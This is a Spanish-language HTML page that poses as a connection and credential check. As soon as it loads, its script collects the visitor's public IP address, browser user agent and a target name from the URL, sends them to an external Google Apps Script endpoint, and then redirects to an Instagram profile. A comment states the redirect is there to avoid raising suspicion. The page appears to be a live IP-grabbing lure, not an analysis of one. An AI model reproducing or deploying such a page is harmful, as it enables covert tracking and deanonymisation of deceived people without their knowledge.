<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Verificando Conexión...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; color: #555; }
    </style>
</head>
<body>
    <div id="status">Validando credenciales de acceso...</div>

    <script>
        async function capturarAuditoria() {
            try {
                // 1. Obtener la IP Real (Servicio Externo)
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipPublica = data.ip;

                // 2. Obtener el Hardware (User Agent)
                const userAgent = navigator.userAgent;

                // 3. CAPTURA DEL USUARIO: Leer el nombre desde la URL (?u=Nombre)
                const urlParams = new URLSearchParams(window.location.search);
                const nombreObjetivo = urlParams.get('u') || "Usuario_Sin_ID";

                // 4. Tu URL de Google Apps Script (Sigue siendo la misma)
                const googleScriptUrl = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";

                // 5. Construir el enlace final con todos los parámetros
                const envioFinal = `${googleScriptUrl}?u=${encodeURIComponent(nombreObjetivo)}&ip=${ipPublica}&ua=${encodeURIComponent(userAgent)}`;

                // 6. Ejecutar envío y Redirección Final a Instagram
                window.location.href = envioFinal;

            } catch (error) {
                // En caso de bloqueo de red, redirigir directo para no levantar sospechas
                window.location.href = "https://www.instagram.com/jon_laptrona_moza?igsh=MWRqeGUwMW94NmFzNg==";
            }
        }

        // Iniciar proceso al cargar la página
        capturarAuditoria();
    </script>
</body>
</html>
